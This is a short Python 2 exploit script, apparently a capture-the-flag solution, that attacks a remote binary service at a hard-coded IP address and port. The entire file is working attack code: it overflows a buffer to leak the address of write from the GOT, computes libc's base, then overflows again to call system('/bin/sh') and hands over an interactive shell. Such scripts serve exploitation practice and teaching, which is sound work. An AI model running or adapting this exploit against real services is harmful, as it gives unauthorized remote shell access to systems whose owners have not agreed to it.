#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '210.61.8.96'
#ip = '10.211.55.48'
port = 51342

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))

write_plt = 0x8048450
write_got = 0x804A028
write_offset = 0xda000
system_offset = 0x3ff10
binsh_offset = 0x15e5e4
main = 0x804867F

p1 = '\x00'*108 + l32(write_plt) + l32(main) + l32(1) + l32(write_got) + l32(4)
io.write(p1)
write = l32(io.read(4))
print '\n' + hex(write)

base = write - write_offset
system = base + system_offset
binsh = base + binsh_offset

p2 = '\x00'*100 + l32(system) + "AAAA" + l32(binsh)
io.write(p2)
io.interact()
